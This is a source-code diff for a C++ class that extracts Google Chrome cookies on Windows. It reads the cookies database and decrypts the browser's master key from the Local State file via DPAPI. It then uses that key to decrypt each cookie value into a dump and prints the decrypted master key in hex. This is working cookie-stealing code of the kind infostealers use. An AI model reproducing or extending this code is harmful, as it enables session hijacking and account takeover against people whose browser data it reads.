@@ -2,6 +2,7 @@
 
 ChromiumProcessor::ChromiumProcessor()
 {
+    prevMasterKey=nullptr;
 #if defined(__WIN64__)
     string appDataLocal_path=std::experimental::filesystem::temp_directory_path().parent_path().parent_path().string();
     userdata_path=appDataLocal_path+string("\\Google\\Chrome\\User Data");
@@ -119,7 +120,7 @@ stringstream ChromiumProcessor::getChromiumCookies()
     }
     string sql="SELECT HOST_KEY, path, encrypted_value FROM cookies";
     sqlite3_stmt *pStmt;
-    int rc, i;
+    int rc;
     rc=sqlite3_prepare(localDB, sql.c_str(), -1, &pStmt, 0);
     if (rc!=SQLITE_OK)
     {
@@ -129,19 +130,25 @@ stringstream ChromiumProcessor::getChromiumCookies()
     cout<<endl;
 
     rc=sqlite3_step(pStmt);
-    //cout<<"RC: "<<rc<<endl;
     while(rc==SQLITE_ROW)
     {
         dump<<sqlite3_column_text(pStmt, 0)<<" ";
         dump<<(char *)sqlite3_column_text(pStmt, 1)<<" ";
 
-        DATA_BLOB encryptedCookies, decryptedCookies;
+        DATA_BLOB encryptedCookies;
+        //DATA_BLOB decryptedCookies;
 
         encryptedCookies.cbData=(DWORD)sqlite3_column_bytes(pStmt, 2);
         encryptedCookies.pbData=(byte *)malloc(encryptedCookies.cbData);
+        memcpy(encryptedCookies.pbData, sqlite3_column_blob(pStmt, 2), encryptedCookies.cbData);
 
-        memcpy(encryptedCookies.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedCookies.cbData);
-
+        string stCookie((char *)encryptedCookies.pbData);
+        EasyDecrypt(stCookie, getMasterKey());
+        if(stCookie==string(""))
+        {
+            stCookie=string((char *)encryptedCookies.pbData);
+        }
+/*
         CryptUnprotectData(&encryptedCookies, NULL, NULL, NULL, NULL, 0, &decryptedCookies);
         if(decryptedCookies.pbData==nullptr || decryptedCookies.cbData<1)
         {
@@ -161,6 +168,7 @@ stringstream ChromiumProcessor::getChromiumCookies()
                 i++;
             }
         }
+*/
         dump<<endl;
         free(encryptedCookies.pbData);
         rc=sqlite3_step(pStmt);
@@ -187,7 +195,7 @@ unsigned char *ChromiumProcessor::getMasterKey()
         cerr<<"file don't exists: "<<LocalStateFile_path<<endl;
         return 0;
     }
-    if (LocalStateFile_path != prevBrowser_path)
+    if (LocalStateFile_path!=prevBrowser_path)
     {
         prevBrowser_path=LocalStateFile_path;
     }
@@ -230,15 +238,24 @@ unsigned char *ChromiumProcessor::getMasterKey()
     memcpy(bRawMasterKey, stMasterKey.data()+5, len);
 
     DATA_BLOB finalK=DPAPIDecrypt((unsigned char *)(bRawMasterKey), len);
+    if(finalK.cbData>0)
+    {
+        if(prevMasterKey!=nullptr)
+        {
+            delete [] prevMasterKey;
+        }
+        prevMasterKey=new unsigned char[finalK.cbData];
+        memcpy(prevMasterKey, finalK.pbData, finalK.cbData);
+    }
 
     fprintf(stdout, "Chromium MasterKey: '");
     for(unsigned long int i=0; i<finalK.cbData; i++)
     {
-        fprintf(stdout, "%.2x", finalK.pbData[i]&0xFF);
+        fprintf(stdout, "%.2x", prevMasterKey[i]&0xFF);
     }
     fprintf(stdout, "' (hex format, decrypted)\n");
 
     delete[] bRawMasterKey;
 
-    return finalK.pbData;
+    return prevMasterKey;
 }
